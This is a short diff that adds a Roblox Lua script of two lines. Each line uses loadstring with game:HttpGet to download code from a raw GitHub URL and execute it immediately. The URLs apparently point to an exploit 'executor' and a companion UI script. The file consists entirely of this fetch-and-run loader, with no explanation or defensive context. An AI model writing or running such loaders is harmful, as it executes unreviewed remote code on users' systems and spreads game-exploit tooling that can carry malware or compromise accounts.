@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/riieiieie91-byte/slash/refs/heads/main/DiveExecutor_v1.3_350x250.lua"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/riieiieie91-byte/slash/refs/heads/main/X%20button"))()
